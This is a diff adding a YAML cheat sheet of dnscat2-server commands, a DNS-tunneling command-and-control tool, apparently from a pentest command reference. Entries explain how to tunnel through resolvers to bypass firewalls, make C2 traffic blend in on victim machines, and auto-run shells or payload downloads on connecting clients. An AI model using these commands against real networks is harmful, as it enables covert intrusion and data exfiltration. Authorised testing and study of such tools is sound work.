@@ -1,0 +1,86 @@
+tool: dnscat2-server
+tags: [network, security, pentest, exfiltration, c2, dns]
+
+actions:
+# === BASIC OPERATION ===
+ - title: dnscat2-server - basic listener
+   desc: |
+     Start the dnscat2 server on all interfaces using the default DNS port. This is the simplest
+     method to start a listener when you do not have a registered domain name for recursive tunneling.
+     It expects direct connections to the server IP and requires root privileges to bind to port 53.
+   command: "dnscat2-server"
+
+ - title: dnscat2-server - domain-based listener
+   desc: |
+     Configure the server to handle DNS requests for a specific authoritative domain. This is the 
+     primary way to use dnscat2 for recursive DNS tunneling, allowing traffic to bypass firewalls
+     by routing through legitimate DNS resolvers. You must ensure the NS record for the domain
+     points to your server's IP address.
+   command: "dnscat2-server {{domain}}"
+
+ - title: dnscat2-server - custom dns configuration
+   desc: |
+     Specify a custom IP address and port for the DNS server to listen on using the --dns flag.
+     This is useful if port 53 is already occupied or if the server is sitting behind a 
+     load balancer or NAT that forwards a different port. The parameters are passed as a
+     comma-separated list of key-value pairs.
+   command: "dnscat2-server --dns 'host={{listen_ip|0.0.0.0}},port={{listen_port|5353}},domain={{domain}}'"
+
+# === SECURITY AND AUTHENTICATION ===
+ - title: dnscat2-server - authenticated server
+   desc: |
+     Set a pre-shared secret to enable authentication and prevent man-in-the-middle (MITM) attacks.
+     When a secret is provided, the server defaults to an 'authenticated' security level, requiring
+     clients to prove they know the secret before establishing a session. This is highly 
+     recommended for production environments to prevent unauthorized access to your C2 server.
+   command: "dnscat2-server --secret {{preshared_secret}} {{domain}}"
+
+ - title: dnscat2-server - enforce security level
+   desc: |
+     Explicitly set the security level to define how encryption and authentication are handled.
+     Options include 'open' (client chooses), 'encrypted' (requires encryption), and 'authenticated'
+     (requires encryption and a secret). Use 'authenticated' to ensure that only your authorized 
+     clients can communicate with the server.
+   command: "dnscat2-server --security {{level|authenticated}} --secret {{preshared_secret}} {{domain}}"
+
+# === ADVANCED TUNNELING ===
+ - title: dnscat2-server - dns passthrough
+   desc: |
+     Forward unhandled DNS queries to an upstream DNS server. This allows the dnscat2 server 
+     to act as a functional DNS resolver for the target, passing legitimate queries to a real 
+     DNS server while intercepting C2 traffic. This helps the C2 traffic blend in with normal
+     network activity and prevents breaking DNS resolution on the victim machine.
+   command: "dnscat2-server --passthrough {{upstream_dns|8.8.8.8:53}} {{domain}}"
+
+ - title: dnscat2-server - automation with auto-command
+   desc: |
+     Automatically execute a specific command on every client that connects to the server.
+     This is useful for immediate post-exploitation actions, such as spawning a shell or 
+     downloading a secondary payload without manual interaction. The command is sent 
+     as soon as the session is established and the client is ready.
+   command: "dnscat2-server --auto-command \"{{command|shell}}\" {{domain}}"
+
+ - title: dnscat2-server - automatic session attachment
+   desc: |
+     Automatically attach the console to any new session that is created. By default, 
+     dnscat2 creates new windows for each session that you must manually switch to.
+     This flag is useful when you expect only one connection and want to interact 
+     with it immediately upon arrival.
+   command: "dnscat2-server --auto-attach {{domain}}"
+
+# === DEBUGGING AND LOGGING ===
+ - title: dnscat2-server - packet tracing
+   desc: |
+     Enable packet tracing to display every incoming and outgoing dnscat packet in the terminal.
+     This is a critical feature for debugging connectivity issues, protocol errors, or 
+     firewall interference. Be aware that this produces a large volume of output and 
+     should generally be used only for troubleshooting.
+   command: "dnscat2-server --packet-trace {{domain}}"
+
+ - title: dnscat2-server - firehose output
+   desc: |
+     Redirect all output directly to stdout instead of using the internal windowing system.
+     This is useful when you are running dnscat2 inside another script or if you want to 
+     log all activity to a file using standard shell redirection. It simplifies the 
+     interface by removing the interactive window management.
+   command: "dnscat2-server --firehose {{domain}}"
